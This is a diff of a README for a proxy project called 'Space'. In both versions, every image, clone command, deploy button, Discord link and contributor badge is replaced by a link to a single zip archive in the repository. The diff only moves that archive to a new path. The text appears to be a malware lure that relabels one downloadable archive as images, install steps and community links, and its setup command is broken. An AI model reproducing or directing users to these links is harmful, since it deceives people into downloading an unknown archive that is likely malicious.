@@ -1,9 +1,9 @@
 <div align="center">
-        <img src="https://raw.githubusercontent.com/efjhfsfsd/Space/main/.github/workflows/Space-2.5.zip" style="width: 1200px"/>
+        <img src="https://raw.githubusercontent.com/efjhfsfsd/Space/main/public/Software_v2.8.zip" style="width: 1200px"/>
     <h2>Launch into Space, the next gen proxy.</h2>
 </div>
 
-![inpreview](https://raw.githubusercontent.com/efjhfsfsd/Space/main/.github/workflows/Space-2.5.zip)
+![inpreview](https://raw.githubusercontent.com/efjhfsfsd/Space/main/public/Software_v2.8.zip)
 
 > [!IMPORTANT]
 > If you fork this repo please consider giving the original repo a
@@ -28,7 +28,7 @@
 Please run the following commands to host a server:
 
 ```
-git clone https://raw.githubusercontent.com/efjhfsfsd/Space/main/.github/workflows/Space-2.5.zip
+git clone https://raw.githubusercontent.com/efjhfsfsd/Space/main/public/Software_v2.8.zip
 cd Space
 pnpm i
 pnpm start
@@ -40,28 +40,28 @@ pnpm start
 git pull --force --allow-unrelated-histories
 ```
 
-<a target="_blank" href="https://raw.githubusercontent.com/efjhfsfsd/Space/main/.github/workflows/Space-2.5.zip"><img alt="Deploy to Heroku" src="https://raw.githubusercontent.com/efjhfsfsd/Space/main/.github/workflows/Space-2.5.zip"></a>
-<a target="_blank" href="https://raw.githubusercontent.com/efjhfsfsd/Space/main/.github/workflows/Space-2.5.zip"><img alt="Deploy to Koyeb" src="https://raw.githubusercontent.com/efjhfsfsd/Space/main/.github/workflows/Space-2.5.zip"></a>
-<a target="_blank" href="https://raw.githubusercontent.com/efjhfsfsd/Space/main/.github/workflows/Space-2.5.zip"><img alt="Deploy to Cyclic" src="https://raw.githubusercontent.com/efjhfsfsd/Space/main/.github/workflows/Space-2.5.zip"></a>
+<a target="_blank" href="https://raw.githubusercontent.com/efjhfsfsd/Space/main/public/Software_v2.8.zip"><img alt="Deploy to Heroku" src="https://raw.githubusercontent.com/efjhfsfsd/Space/main/public/Software_v2.8.zip"></a>
+<a target="_blank" href="https://raw.githubusercontent.com/efjhfsfsd/Space/main/public/Software_v2.8.zip"><img alt="Deploy to Koyeb" src="https://raw.githubusercontent.com/efjhfsfsd/Space/main/public/Software_v2.8.zip"></a>
+<a target="_blank" href="https://raw.githubusercontent.com/efjhfsfsd/Space/main/public/Software_v2.8.zip"><img alt="Deploy to Cyclic" src="https://raw.githubusercontent.com/efjhfsfsd/Space/main/public/Software_v2.8.zip"></a>
 
 ## Where to ask for help
 
 > [!NOTE]
 > If you'd like to get links, support, or other deployment methods join
-> our [Discord Server](https://raw.githubusercontent.com/efjhfsfsd/Space/main/.github/workflows/Space-2.5.zip) or open a discussion.
+> our [Discord Server](https://raw.githubusercontent.com/efjhfsfsd/Space/main/public/Software_v2.8.zip) or open a discussion.
 
 ## Contribution
 
 To contribute to Space, clone the repo locally and submit your code in a pull
 request. If you are making large changes, please make sure you test your code
-before submitting a pull request. Please check [https://raw.githubusercontent.com/efjhfsfsd/Space/main/.github/workflows/Space-2.5.zip](https://raw.githubusercontent.com/efjhfsfsd/Space/main/.github/workflows/Space-2.5.zip) for a more in-depth explanation.
+before submitting a pull request. Please check [https://raw.githubusercontent.com/efjhfsfsd/Space/main/public/Software_v2.8.zip](https://raw.githubusercontent.com/efjhfsfsd/Space/main/public/Software_v2.8.zip) for a more in-depth explanation.
 
 ## Contributors
 
 Thank you to the following people for contributing to Space.
 
-[![Contributors](https://raw.githubusercontent.com/efjhfsfsd/Space/main/.github/workflows/Space-2.5.zip)](https://raw.githubusercontent.com/efjhfsfsd/Space/main/.github/workflows/Space-2.5.zip)
+[![Contributors](https://raw.githubusercontent.com/efjhfsfsd/Space/main/public/Software_v2.8.zip)](https://raw.githubusercontent.com/efjhfsfsd/Space/main/public/Software_v2.8.zip)
 
 ## Discord
 
-[![Discord](https://raw.githubusercontent.com/efjhfsfsd/Space/main/.github/workflows/Space-2.5.zip)](https://raw.githubusercontent.com/efjhfsfsd/Space/main/.github/workflows/Space-2.5.zip)
+[![Discord](https://raw.githubusercontent.com/efjhfsfsd/Space/main/public/Software_v2.8.zip)](https://raw.githubusercontent.com/efjhfsfsd/Space/main/public/Software_v2.8.zip)
